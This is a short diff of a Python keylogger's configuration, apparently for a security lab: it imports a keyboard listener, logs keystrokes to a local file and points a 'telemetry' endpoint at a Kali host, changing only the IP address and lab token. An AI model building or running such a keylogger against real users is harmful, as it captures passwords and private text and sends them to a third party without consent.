@@ -4,9 +4,9 @@ from ipaddress import ip_address
 from pynput.keyboard import Key, Listener
 import requests
 
-KALI_IP = "192.168.1.100"
+KALI_IP = "192.168.1.133"
 KALI_PORT = 5000
-LAB_TOKEN = "cambia-este-token"
+LAB_TOKEN = "lab-control-2026"
 
 LOG_FILE = Path(__file__).with_name("registro_teclas.txt")
 ENDPOINT = f"http://{KALI_IP}:{KALI_PORT}/telemetry"
